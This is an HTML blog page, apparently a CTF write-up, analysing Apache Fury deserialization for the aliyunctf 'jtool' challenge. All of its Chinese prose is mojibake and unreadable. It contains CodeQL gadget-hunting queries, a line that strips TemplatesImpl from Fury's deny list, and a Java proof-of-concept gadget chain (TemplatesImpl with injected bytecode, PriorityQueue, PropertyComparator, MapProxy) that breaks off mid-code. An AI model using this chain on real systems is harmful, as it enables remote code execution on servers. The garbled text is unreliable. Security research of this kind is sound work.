<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Furyååºåˆ—åŒ–&amp;aliyunctf-jtool | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="å‰è¨€ï¼šå½“æ—¶çœ‹ä¸æ‡‚è¿™ä¸ªï¼Œæ— æ„é—´çœ‹äº†ä¸‹hessianååºåˆ—åŒ–ï¼Œç„¶åå°±æœ‰æƒ³æ³•å’Œæ€è·¯äº†ï¼Œç„¶åçœ‹ç½‘ä¸Šæ–‡ç« ä¹Ÿæ˜¯æ²¡æœ‰çœ‹åˆ°é‚£ä¸ªæŠŠè¿™ä¸ªè®²æ˜ç™½çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çœ‹å¾—">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Furyååºåˆ—åŒ–&amp;aliyunctf-jtool" />
<meta property="og:description" content="å‰è¨€ï¼šå½“æ—¶çœ‹ä¸æ‡‚è¿™ä¸ªï¼Œæ— æ„é—´çœ‹äº†ä¸‹hessianååºåˆ—åŒ–ï¼Œç„¶åå°±æœ‰æƒ³æ³•å’Œæ€è·¯äº†ï¼Œç„¶åçœ‹ç½‘ä¸Šæ–‡ç« ä¹Ÿæ˜¯æ²¡æœ‰çœ‹åˆ°é‚£ä¸ªæŠŠè¿™ä¸ªè®²æ˜ç™½çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çœ‹å¾—" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-04-27T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-07-02T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Furyååºåˆ—åŒ–&amp;aliyunctf-jtool"/>
<meta name="twitter:description" content="å‰è¨€ï¼šå½“æ—¶çœ‹ä¸æ‡‚è¿™ä¸ªï¼Œæ— æ„é—´çœ‹äº†ä¸‹hessianååºåˆ—åŒ–ï¼Œç„¶åå°±æœ‰æƒ³æ³•å’Œæ€è·¯äº†ï¼Œç„¶åçœ‹ç½‘ä¸Šæ–‡ç« ä¹Ÿæ˜¯æ²¡æœ‰çœ‹åˆ°é‚£ä¸ªæŠŠè¿™ä¸ªè®²æ˜ç™½çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çœ‹å¾—"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Furyååºåˆ—åŒ–\u0026aliyunctf-jtool",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Furyååºåˆ—åŒ–\u0026aliyunctf-jtool",
  "name": "Furyååºåˆ—åŒ–\u0026aliyunctf-jtool",
  "description": "å‰è¨€ï¼šå½“æ—¶çœ‹ä¸æ‡‚è¿™ä¸ªï¼Œæ— æ„é—´çœ‹äº†ä¸‹hessianååºåˆ—åŒ–ï¼Œç„¶åå°±æœ‰æƒ³æ³•å’Œæ€è·¯äº†ï¼Œç„¶åçœ‹ç½‘ä¸Šæ–‡ç« ä¹Ÿæ˜¯æ²¡æœ‰çœ‹åˆ°é‚£ä¸ªæŠŠè¿™ä¸ªè®²æ˜ç™½çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çœ‹å¾—",
  "keywords": [
    
  ],
  "articleBody": " å‰è¨€ï¼šå½“æ—¶çœ‹ä¸æ‡‚è¿™ä¸ªï¼Œæ— æ„é—´çœ‹äº†ä¸‹hessianååºåˆ—åŒ–ï¼Œç„¶åå°±æœ‰æƒ³æ³•å’Œæ€è·¯äº†ï¼Œç„¶åçœ‹ç½‘ä¸Šæ–‡ç« ä¹Ÿæ˜¯æ²¡æœ‰çœ‹åˆ°é‚£ä¸ªæŠŠè¿™ä¸ªè®²æ˜ç™½çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çœ‹å¾—å°‘hhhï¼‰\nè¿™ç±»éå¸¸è§„ååºåˆ—åŒ–ï¼Œå°±æ˜¯æŸ¥çœ‹ä»–åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é€»è¾‘ï¼Œç„¶åæ‰¾å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•æœ‰å“ªäº›ç„¶åä½œä¸ºé“¾å­çš„å¼€å¤´ï¼ˆè®²çš„æœ‰ç‚¹ç¬¼ç»Ÿï¼Œä¸‹é¢æ¥ç‚¹å®é™…çš„\nç¯å¢ƒï¼šç”¨åˆ°aliyunctf-jtoolsçš„jaråŒ…ï¼Œä¸‹è½½é“¾æ¥æ¯”èµ›å®˜ç½‘åº”è¯¥è¿˜æœ‰\ncalc calc = new calc(); HashMap hashMap = new HashMap(); hashMap.put(\"val\", calc); Fury fury = Fury.builder().withLanguage(Language.JAVA) .requireClassRegistration(false) .build(); byte[] serialize = fury.serialize(hashMap); Fury ser_fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build(); Object deserialize = ser_fury.deserialize(serialize); è¿™ä¸ªæ˜¯æˆ‘æœ€åˆçš„ä¸€ä¸ªdemo\n0x01 åºåˆ—åŒ–\u0026ååºåˆ—åŒ– é€»è¾‘ ååºåˆ—åŒ– ç›´æ¥çœ‹æ˜¯æ€ä¹ˆååºåˆ—åŒ–çš„å§ï¼Œæ­£å¸¸ååºåˆ—åŒ–å¯¹è±¡ï¼Œä¼šåˆ°è¿™ä¸ªdefault:ä¸­ï¼ˆè°ƒè¯•åˆ°ä¸‹å›¾ï¼Œå‰é¢çš„åœ°æ–¹æˆ‘å°±æ²¡è®°å½•ï¼Œæ„Ÿè§‰è®°å¤šäº†ï¼Œæ–‡ç« æŒºè‡ƒè‚¿ï¼Œçœ‹å¾—çƒ¦ï¼‰ï¼Œç„¶åè°ƒç”¨æ¯ä¸ªå¯¹è±¡çš„ClassInfoä¸­è®¾ç½®çš„serializer#readæ–¹æ³•è¿›è¡Œè¿˜åŸè¿™ä¸ªå¯¹è±¡ï¼Œç„¶åä¸Šé¢è¿˜æœ‰ä¸€äº›case æˆ‘ç®€å•çœ‹äº†æ²¡ä»€ä¹ˆæ“ä½œç©ºé—´ï¼Œéƒ½æ˜¯è¿˜åŸä¸€äº›å¸¸ç”¨ç±»å‹ï¼ˆintä»€ä¹ˆçš„ï¼‰ï¼Œè€Œè¿™ä¸ªserializeræ˜¯åœ¨åºåˆ—åŒ–ä¸­è®¾ç½®çš„ï¼Œé‚£æˆ‘ä»¬å»çœ‹çœ‹åºåˆ—åŒ–å§\nåºåˆ—åŒ– Furyæœ‰ä¸€ä¸ªmapå­˜å‚¨äº†ä¸€äº›ç±»çš„ClassInfoï¼Œè¿™é‡Œç±»ï¼Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šç›´æ¥ä»è¿™ä¸ªmapè·å–å±äºè‡ªå·±çš„ClassInfo\nç„¶åçœ‹åˆ°æœ‰86å¯¹å€¼ï¼Œä¹Ÿå°±æ˜¯æœ‰86ä¸ªreadæ–¹æ³•å¯ä»¥æŸ¥çœ‹ç›¸å…³çš„ä»£ç é€»è¾‘æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼ˆé“¾å­èµ·ç‚¹ï¼‰\nå½“ç„¶é™¤äº†mapä¸­è®°å½•ä¹‹å¤–çš„ç±»ï¼ŒFuryä¹Ÿä¼šç”Ÿæˆserializerä¸ºå…¶å®ç°åºåˆ—åŒ–\nthis.addSerializer(cls, this.createSerializer(cls)); è·Ÿè¿›this.createSerializerï¼Œç„¶åä¸€ç›´åˆ°getSerializerClass()\nè¿™é‡Œä¼šå¯¹è¦åºåˆ—åŒ–çš„classè¿›è¡Œä¸€äº›æ£€æµ‹ï¼Œç„¶ååœ¨è°ƒç”¨this.getObjectSerializerClass()è·å–Serializerçš„classï¼Œè¿™é‡Œæ£€æµ‹æˆ‘ä¸»è¦å…³æ³¨äº†Serializable.classè¿™ä¸ªç‚¹ï¼Œè¿˜æœ‰requireJavaSerialization()è¿™ä¸ªæ˜¯å› ä¸ºé‡Œé¢æœ‰å…³äºSerializable.classçš„åˆ¤æ–­ï¼Œç„¶åå‘ç°åªè¦classä¸æ˜¯ä»¥javaå¼€å¤´å³ä½¿æ²¡ç»§æ‰¿Serializable.classä¹Ÿå¯ä»¥è¢«Furyååºåˆ—åŒ–ï¼Œåˆæ­¥æ¨æ–­Furyæ˜¯å¯ä»¥ååºåˆ—åŒ–æ²¡ç»§æ‰¿Serializable.classçš„ç±»\nç„¶åè·Ÿthis.getObjectSerializerClass()\nå…ˆä¼šæœ‰ä¸€ä¸ªcheckNotInDisallowedList()é»‘åå•æ£€æµ‹ï¼Œåé¢ç»§ç»­è°ƒè¯•\nä¸‹é¢è¿™ä¸ªåœ°æ–¹è·Ÿè¿›å»\nç„¶ååˆ°ä¸‹é¢è¿™ä¸ªclassLoader.loadClassï¼Œä¸ºä»€ä¹ˆè¦è·Ÿè¿™ä¸ªåœ°æ–¹ç­‰ä¸‹å°±çŸ¥é“äº†\n0x02 åŠ¨æ€ç”Ÿæˆçš„serializer classloaderæ˜¯ClassLoaderUtils$ByteArrayClassLoaderæ¥åŠ è½½çš„ï¼Œç„¶åä¼šåˆ°çˆ¶ç±»çš„loadClassæ–¹æ³•ï¼Œç„¶åå†åˆ°ä¸‹å›¾çš„findClass() ç”Ÿæˆclass\nä»–è¿™ä¸ªserializeræ˜¯åŠ¨æ€ç”Ÿæˆï¼Œåˆ°æ—¶å€™æˆ‘ä»¬è°ƒè¯•æ˜¯è°ƒè¯•ä¸äº†å…¶read()æ–¹æ³•çš„ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å…¶classçš„byte[]ï¼Œä¸‹é¢åç»­çš„æ“ä½œï¼Œå°±æ˜¯é€šè¿‡åŠ è½½byte[]ç”Ÿæˆclassç„¶åé€šè¿‡åå°„( newInstance() )å¾—åˆ°serializerå¯¹è±¡\næˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªbyte[]ç”Ÿæˆclassæ–‡ä»¶ï¼ŒæŸ¥çœ‹å…¶ä»£ç é€»è¾‘\nbyte[] bytes = {-54, -2, -70, -66, ...}; FileOutputStream fileOutputStream = new FileOutputStream(\"test.class\"); fileOutputStream.write(bytes); fileOutputStream.close(); è¿™é‡Œæˆ‘æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªTemplatesImpl.classçš„serializerï¼ˆä¸ºä»€ä¹ˆé€‰è¿™ä¸ªï¼Œå› ä¸ºç»å…¸çº¯ç‰›å¥¶ï¼‰\nåœ¨è°ƒè¯•é‚£ä¸ªé»‘åå•æ£€æµ‹æ—¶ï¼Œè¿è¡Œä¸‹é¢è¿™ä¸ªå°±èƒ½ç»•è¿‡é‚£ä¸ªåœ°æ–¹ï¼Œç„¶åç”Ÿæˆæˆ‘ä»¬çš„serializer\nDEFAULT_DISALLOWED_LIST_SET.map.remove(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\") ç„¶ååªæœ‰this.readAndSetFieldsé‡Œé¢é€»è¾‘èƒ½å®¡è®¡ä¸‹ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆååºåˆ—åŒ–åå¯¹æ–¹æ³•çš„è°ƒç”¨ä¹Ÿå¯èƒ½æ˜¯ç±»æ²¡é€‰å¯¹ï¼Œä½†æ˜¯é‚£ä¸ª(å°±æ˜¯è¿™ä¸ªclassæ€ä¹ˆç”Ÿæˆè¿™äº›çš„ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å†æ·±å…¥åˆ†æåˆ†æ)\n0x03 é“¾å­æŸ¥æ‰¾ å›åˆ°ä¹‹å‰çš„86ä¸ªreadæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘å…¶å®æƒ³èµ·äº†hessianååºåˆ—åŒ–çš„hashmapï¼Œç„¶åæˆ‘ååºåˆ—åŒ–äº†ä¸€ä¸ªhashmap\nçœ‹åˆ°ä¸‹é¢è¿™é‡Œï¼Œä¼šå…ˆååºåˆ—åŒ–keyå’Œvalueï¼Œç„¶åè¿›è¡Œmap.putï¼Œè¿™é‡Œä¸å°±èƒ½è¿›è¡Œåˆ©ç”¨äº†ä¹ˆï¼ˆå¯¹è±¡è°ƒç”¨ï¼‰\nhash,hashcode,equalséƒ½èƒ½åˆ©ç”¨äº†å“‡ ç„¶åæˆ‘ä»¬åœ¨çœ‹åˆ°HashMapSerializerä¸Šé¢çš„ä¸Šé¢æ˜¯ç»§æ‰¿AbstractMapSerializerï¼Œå…¶å†ç»§æ‰¿Serializer\n86ä¸ªreadæˆ‘æ€»ä¸èƒ½æŒ¨ä¸ªå»çœ‹å§ï¼Œä½†æ˜¯æˆ‘ä»¬èµ·ç‚¹å¤§è‡´å¯ä»¥è®¾ç½®ä¸ºç»§æ‰¿Serializerçš„readæ–¹æ³•\næ€è·¯ è¿™é‡Œå¤§è‡´å°±ä¸¤ç§å§\né€šè¿‡readä¸ºèµ·ç‚¹ï¼Œåˆ°sinkç‚¹ é€šè¿‡readä¸ºèµ·ç‚¹ï¼Œåˆ°jdkåŸç”Ÿååºåˆ—åŒ–ï¼Œreadobjectå†åˆ°sinkç‚¹ sinkç‚¹ sourceç‚¹è‡ªç„¶æ˜¯ç»§æ‰¿Serializerçš„readæ–¹æ³•\nèµ·åˆæ˜¯ç”¨tabbyå°è¯•æ‰¾é“¾å­çš„ï¼Œç„¶åæ„Ÿè§‰tabbyæ‰¾å¾—æœ‰ç‚¹åŠ›ä¸ä»å¿ƒã€‚ç„¶åå»æŠ˜è…¾qläº†,ä¹ŸæŠ˜è…¾äº†ä¼šå§ã€‚ç›¸å¯¹æ¥è¯´qlç»™æˆ‘çš„æ„Ÿè§‰ä¼šå¤æ‚å¾ˆå¤šï¼Œç„¶åè‡ªæˆ‘æ„Ÿè§‰è¿™ç¯‡æ–‡ç« åé¢å†…å®¹ä¸æ˜¯å¾ˆå¥½ï¼Œæƒ³ç€å†™ä¸€åŠäº†éƒ½ï¼Œè¿˜æ˜¯å®Œä¸ªç»“å§\nå…ˆè®²sinkç‚¹å§ï¼Œå› ä¸ºè·Ÿæ€è·¯å¯¹åº”äº›ï¼Œæœ‰ç‚¹ç…§ç€ç­”æ¡ˆæ‰¾é“¾å­çš„æ„æ€äº†ï¼ˆè‹¦ç¬‘\nè¿™é‡Œfuryæœ¬èº«è‡ªå¸¦200+ç±»çš„è¿‡æ»¤ï¼Œç„¶åå‡ºé¢˜äººåˆåŠ äº†ä¸€ä¸ªcom.feilong.libçš„è¿‡æ»¤ï¼Œæ‰€ä»¥ä¹Ÿèƒ½å¾€äºŒæ¬¡ååºåˆ—åŒ–è¿™ä¸ªæ–¹å‘æƒ³å§\né‚£ä¹Ÿå°±æ˜¯å…ˆæ‰¾readObjectç‚¹äº†å‘—\nimport java // å®šä¹‰ ObjectInputStream åŠå…¶å­ç±»ç±»å‹ class OISFamily extends RefType { OISFamily() { this.hasQualifiedName(\"java.io\", \"ObjectInputStream\") or this.getASupertype+().hasQualifiedName(\"java.io\", \"ObjectInputStream\") } } // æŸ¥æ‰¾æ‰€æœ‰è°ƒç”¨ from MethodCall call, Method method where method.hasName(\"readObject\") and method.getDeclaringType() instanceof OISFamily and call.getMethod() = method and not call.getEnclosingCallable().getDeclaringType().getQualifiedName().matches(\"%com.feilong.lib%\") and call.getEnclosingCallable().getName()!=\"readObject\" select call, call.getEnclosingCallable().getName(),call.getEnclosingCallable().getDeclaringType().getQualifiedName() çœ‹äº†ä¸‹æœ€æœ‰æœºä¼šçš„æ˜¯IoUtilå’ŒJavaSerializerå§ï¼Œå…¶ä»–æ–¹æ³•ä¸å¤ªå¯èƒ½è°ƒç”¨åˆ°\nç„¶åå°±å»çœ‹æ€ä¹ˆè°ƒç”¨åˆ°JavaSerializerï¼Œç„¶åæˆ‘åˆå»æŠŠåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æµç¨‹åˆå»çœ‹äº†ç¯‡ï¼Œå¾—å‡ºè°ƒç”¨ä¸äº†ï¼ˆä¸åœ¨mapé‡Œï¼Œå…¶ä»–ç‚¹ä¹Ÿæ²¡å‘ç°èƒ½è°ƒç”¨åˆ°çš„ï¼‰ï¼Œä¼°è®¡æ˜¯ä¸“é—¨fury.registeræ‰è¡Œ,ç”¨æ¥æé«˜å…¼å®¹æ€§çš„ æ„Ÿè§‰wwwã€‚ç„¶åè¿˜å»æƒ³äº†ä¸‹èƒ½ä¸èƒ½ä»åºåˆ—åŒ–byte[]é‡Œé¢æ„é€ å‡ºJavaSerializerï¼Œè®©ä»–ååºåˆ—åŒ–å»è°ƒç”¨\nçœ‹äº†ååºåˆ—åŒ–å¯¹byte[]çš„å¤„ç†å‘ç°ä¸è¡Œhhï¼Œä»–mapä¸­Serializerï¼Œåœ¨åºåˆ—åŒ–byte[]é‡Œé¢ä¼šå­˜ä¸€ä¸ªç´¢å¼•ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥å»mapè°ƒç”¨å¯¹åº”ç´¢å¼•å¾—åˆ°å¯¹åº”çš„Serializerï¼Œè€Œä¸æ˜¯mapä¸­ï¼Œä¼šå’Œåºåˆ—åŒ–ä¸€æ ·çš„æ­¥éª¤å»newSerializerã€‚æ‰€ä»¥ä¹Ÿæ“ä½œä¸äº†\né‚£å°±æŠŠç‚¹çœ‹åˆ°IoUtilï¼Œç„¶åè¿™é‡Œæ€è·¯å°±åº”è¯¥å…ˆä»readæƒ³åŠæ³•å¾€è¿™ä¸ªç‚¹è°ƒç”¨äº†ï¼Œç›´æ¥æŸ¥å‡ºæ¥çš„æœ‰å¾ˆå¤šéƒ½æ˜¯èµ°clone()çš„ã€‚åé¢çœ‹æœ‰æ²¡æœ‰æœºä¼šå†è¯´ï¼Œå…ˆæŠŠwpçš„é‚£æ¡æ•´äº†ï¼Œè¿™é‡Œä¸€ç›´å¾€ä¸Šæ‰¾å¯ä»¥åˆ°AbstractConverter#convert\næˆ‘è§‰å¾—qlä¸åˆ»æ„å†™ï¼Œåº”è¯¥è¿˜ä¸èƒ½é€šè¿‡cb getteré‚£ä¸ªç‚¹(ä¸åªæ˜¯getter)åˆ°getè§¦å‘invokeå†åˆ°convertå§\nè¿™é‡Œå°±åˆ†ä¸ºä¸¤æ®µäº†ï¼Œåé¢è¿™æ®µæˆ‘å°±ç›´æ¥æ‰¾invokeåˆ°convertInternalï¼ˆè¿™é‡Œresultæœ‰å¾ˆå¤šï¼Œå°±ç›´æ¥å…ˆå†™çš„invokeçš„ï¼‰\n/** @kind path-problem */ import java import semmle.code.java.dataflow.FlowSources class GetMethod extends Method { GetMethod(){ this.getDeclaringType().getASupertype*().hasQualifiedName(\"java.lang.reflect\", \"InvocationHandler\") and this.getName().matches(\"invoke\") } } class LookupMethod extends Method { LookupMethod() { this.getName()=\"convert\" and this.getDeclaringType().getQualifiedName().matches(\"cn.hutool.core.convert.AbstractConverter%\") } } query predicate edges(Method a, Method b) { a.polyCalls(b) } from GetMethod source, LookupMethod sink where edges+(source, sink) select source, source, sink, \"$@ $@ to $@ $@\" , source.getDeclaringType(),source.getDeclaringType().getName(), source,source.getName(), sink.getDeclaringType(),sink.getDeclaringType().getName(), sink,sink.getName() å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿™æ¡å’Œwpä¸­è¿˜æŒºç¬¦åˆçš„\nsourceç‚¹ ç„¶åè¿™é‡Œæ‰¾åˆ°readåˆ°compareå°±æ²¡é‚£ä¹ˆåƒçš„äº†\n/** @kind path-problem */ import java import semmle.code.java.dataflow.FlowSources class GetMethod extends Method { GetMethod(){ exists(Method m,Parameter p| m.hasName(\"read\") and m.getDeclaringType().getASupertype*().getQualifiedName().matches(\"org.apache.fury.serializer.Serializer%\") and exists(m.getAnOverride()) and p.getType().(RefType).hasQualifiedName(\"org.apache.fury.memory\", \"MemoryBuffer\") and p.getName() != \"p0\" and m = p.getCallable() and this = m ) } } class LookupMethod extends Method { LookupMethod() { exists(MethodCall a| a.getCallee().getName()=\"getProperty\" and this = a.getCaller() ) } } query predicate edges(Method a, Method b) { a.polyCalls(b) } from GetMethod source, LookupMethod sink where edges+(source, sink) and sink.getDeclaringType().getQualifiedName().matches(\"com.feilong.core.util.comparator.PropertyComparator%\") select source, source, sink, \"$@ $@ to $@ $@\" , source.getDeclaringType(),source.getDeclaringType().getName(), source,source.getName(), sink.getDeclaringType(),sink.getDeclaringType().getName(), sink,sink.getName() å¯ä»¥çœ‹åˆ°æ˜¯æœ‰åå·®çš„ï¼Œç„¶åè¿™é‡Œreadæ–¹æ³•æœ‰å¾ˆå¤šï¼Œå…¶å®å¾ˆå¤šå¯ä»¥æ’é™¤ï¼Œå› ä¸ºè¦è°ƒç”¨åˆ°æ‰è¡Œ \u0026 èƒ½å‚¨å­˜å¯¹è±¡æ‰è¡Œï¼ˆæ¯”å¦‚mapï¼‰è¿™ç§ï¼Œå› ä¸ºä¸èƒ½å‚¨å­˜å¯¹è±¡çš„è¯ï¼Œä½ åç»­gadgetä¹Ÿæ— æ³•å±•å¼€ï¼ˆå› ä¸ºä½ èµ·ç‚¹ç±»æœ€å°‘è¦æ»¡è¶³èƒ½è¿˜åŸä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä½¿è¿™ä¸ªå¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ–¹æ³•å§ï¼‰ã€‚ç„¶åæˆ‘çœ‹äº†å¤§å¤šç»“æœï¼Œå¾ˆå¤šéƒ½å¯ä»¥æ’é™¤æ‰ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å»çœ‹ä»–å®šä¹‰äº†çš„mapSerializerä¸­æœ‰é‚£äº›ï¼Œç„¶åçœ‹classç±»å‹è¿›è¡Œç­›é€‰ï¼Œç„¶åå¯¹codeql sourceè¿›è¡Œé™åˆ¶ã€‚ç„¶åè¿˜æœ‰å¾ˆå¤šreadåé¢ä¹Ÿæ˜¯æŒ‡å‘CollectionSerializer#readï¼Œæ‰€ä»¥è¿™ä¸ªç‚¹å¤šå°‘ä¹Ÿä¼šå»ç ”ç©¶ä¸‹ã€‚\nç„¶åæ­£å¸¸æ€è·¯è‚¯å®šä¸ä¼šç›´æ¥å°±æ‰¾compareæ–¹æ³•å˜›ï¼ˆçº¯ç…§ç­”æ¡ˆæ‰¾ï¼‰ï¼Œæ€è·¯çš„è¯æˆ‘è§‰å¾—\nå¯ä»¥æœ‰ä¸ªsinkmethodé›†åˆï¼Œç„¶åæ‰¾è¿™ä¸ªé›†åˆï¼ˆå°±æ˜¯è¯¯æŠ¥å¾ˆå¤šå°±æ˜¯äº†hhï¼‰ edgeså‡ å±‚ï¼Œç„¶åçœ‹è¿™å‡ å±‚é‡Œé¢æœ‰é‚£äº›å‡½æ•°å¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯è¿™ä¸ªè¯¯æŠ¥å°±å¤ªå¤ªå¤§äº† ç„¶åè¿™é‡Œcompareä¸æ˜¯æ²¡æ‰¾åˆ°å¯¹åº”çš„é“¾å­ï¼Œæˆ‘å»çœ‹äº†ä¸‹jdkçš„ç±»ï¼Œcodeqlæ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Œç„¶åå‘ç°æ˜¯è°ƒç”¨çš„classæ–‡ä»¶ï¼Œè€Œä¸”æ„Ÿè§‰èŠ‚ç‚¹ä¹Ÿå‡ºäº†é—®é¢˜ï¼Œæ¯”å¦‚siftUpUsingComparatorè¿™ä¸ªæ–¹æ³•å°±æ‰¾ä¸åˆ°ã€‚\nimport java from RefType queueType, Method m where m.getDeclaringType().getASupertype*().getQualifiedName().matches(\"java.util.PriorityQueue%\") select m,m.getLocation().getFile().getAbsolutePath() ç„¶åæˆ‘å»æ‰¾ä¸ªäº†jdkçš„æºç ä¸€èµ·åŠ åˆ°æ•°æ®åº“é‡Œï¼Œä½†æ˜¯ç”Ÿæˆè¦å¾ˆä¹…ï¼Œè€Œä¸”å¾ˆå¡ï¼ˆæˆ‘æ˜¯ç›´æ¥åç¼–è¯‘ï¼Œç„¶åcodeql database create db-name --language=java --source-root=./sources --build-mode=noneï¼Œç”Ÿæˆçš„ï¼‰æœ‰å¥½çš„æ–¹æ³•ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬å®‰åˆ©ä¸‹hhï¼ˆwin10ï¼‰\nç”Ÿæˆä¹‹ååŸæœ¬çš„æ²¡æ‰¾å‡ºæ¥ï¼ŒtreeMapçš„æ‰¾å‡ºæ¥ï¼Œhhhã€‚\nç„¶åç”¨treemapæ”¹äº†ä¸‹å¼€å¤´æ˜¯å¯ä»¥æ‰“çš„ï¼Œæ„é€ æœ‰äº›å°é—®é¢˜ï¼Œé˜²æ­¢ç”Ÿæˆçš„æ—¶å€™è§¦å‘pocï¼Œä¹Ÿæ˜¯ç”¨æœ€æš´åŠ›çš„åå°„è§£å†³äº†\npackage tostring_test; import cn.hutool.core.map.BiMap; import cn.hutool.core.map.MapProxy; import cn.hutool.core.util.ReflectUtil; import cn.hutool.core.util.SerializeUtil; import com.feilong.core.util.comparator.PropertyComparator; import com.feilong.lib.collection4.iterators.FilterIterator; import com.feilong.lib.digester3.ObjectCreationFactory; import com.google.common.collect.ArrayListMultimap; import com.google.common.collect.Multimap; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import org.apache.fury.Fury; import org.apache.fury.config.Language; import org.apache.fury.serializer.JavaSerializer; import java.lang.invoke.SerializedLambda; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; import java.util.PriorityQueue; import java.util.TreeMap; import com.google.common.base.Predicate; public class compare_test { static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field declaredField = obj.getClass().getDeclaredField(fieldName); declaredField.setAccessible(true); declaredField.set(obj, value); } public static void main(String[] args) throws Exception, IllegalAccessException { byte[] bytes = ClassPool.getDefault().get(calc.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); Field name = TemplatesImpl.class.getDeclaredField(\"_name\"); name.setAccessible(true); name.set(tmpl, \"hello\"); TemplatesImpl tmpl1 = new TemplatesImpl(); Field bytecodes1 = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes1.setAccessible(true); bytecodes1.set(tmpl1, new byte[][]{bytes}); Field name1 = TemplatesImpl.class.getDeclaredField(\"_name\"); name1.setAccessible(true); name1.set(tmpl1, \"hello2\"); ///templates // String prop = \"digester\"; String prop = \"digester\"; PropertyComparator propertyComparator = new PropertyComparator(prop); Map TreeMap = new TreeMap(propertyComparator); Object templatesImpl1 = tmpl1; Object templatesImpl = tmpl; PropertyComparator propertyComparator1 = new PropertyComparator(\"outputProperties\"); PriorityQueue priorityQueue1 = new PriorityQueue(2, propertyComparator1); ReflectUtil.setFieldValue(priorityQueue1, \"size\", \"2\"); Object[] objectsjdk = {templatesImpl1, templatesImpl}; setFieldValue(priorityQueue1, \"queue\", objectsjdk); /////jdk byte[] data = SerializeUtil.serialize(priorityQueue1); Map hashmap = new HashMap(); hashmap.put(prop, data); MapProxy mapProxy = new MapProxy(hashmap); ObjectCreationFactory test = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy); ObjectCreationFactory test1 = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy); TreeMap.put(test,1); // 